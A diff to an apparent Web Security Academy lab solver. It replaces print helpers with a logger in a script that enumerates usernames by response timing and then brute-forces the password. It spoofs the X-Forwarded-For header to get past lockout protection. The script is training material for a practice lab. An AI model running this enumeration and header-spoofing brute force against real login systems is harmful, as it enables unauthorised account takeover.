@@ -1,21 +1,15 @@
-from web_security_academy.core.utils import (
-    auth_lab_usernames,
-    auth_lab_passwords,
-    print_info,
-    print_info_secondary,
-    print_success,
-    print_fail,
-)
+from web_security_academy.core.logger import logger
+from web_security_academy.core.utils import auth_lab_usernames, auth_lab_passwords
 from time import perf_counter
 
 
 def solve_lab(session):
     usernames = auth_lab_usernames()
     passwords = auth_lab_passwords()
-    print()
 
     # User enumeration
-    print_info("Enumerating users by examining response times...")
+    logger.info("Enumerating users by examining response times...")
+    logger.toggle_newline()
     for i, user in enumerate(usernames):
         # Header used to bypass brute-force protection
         headers = {"X-Forwarded-For": f"192.168.0.{i+1}"}
@@ -27,15 +21,19 @@ def solve_lab(session):
 
         response_time = end - start
         if response_time < 5:
-            print_info_secondary(f"{user} => {response_time} seconds", end="\x1b[1K")
+            logger.info(f"{user} => {response_time} seconds")
         else:
-            print_success(f"{user} => {response_time} seconds\n")
+            logger.success(f"{user} => {response_time} seconds")
+            logger.toggle_newline()
             break
     else:
-        print_fail("Unable to enumerate a valid username.")
+        logger.failure("Unable to enumerate a valid username.")
+        logger.toggle_newline()
+        return
 
     # Password enumeration
-    print_info(f"Brute-forcing {user}'s password...")
+    logger.info(f"Brute-forcing {user}'s password...")
+    logger.toggle_newline()
     for i, password in enumerate(passwords):
         headers = {"X-Forwarded-For": f"192.168.0.{i+1}"}
         data = {"username": user, "password": password}
@@ -44,11 +42,14 @@ def solve_lab(session):
         )
 
         if resp.status_code != 302:
-            print_info_secondary(f"{password} => Incorrect", end="\x1b[1K")
+            logger.info(f"{password} => Incorrect")
         else:
-            print_success(f"{password} => Correct!\n")
+            logger.success(f"{password} => Correct!")
+            logger.toggle_newline()
             break
     else:
-        print_fail(f"Unable to brute-force {user}'s password.")
+        logger.failure(f"Unable to brute-force {user}'s password.")
+        logger.toggle_newline()
+        return
 
     session.login(user, password, with_csrf=False)
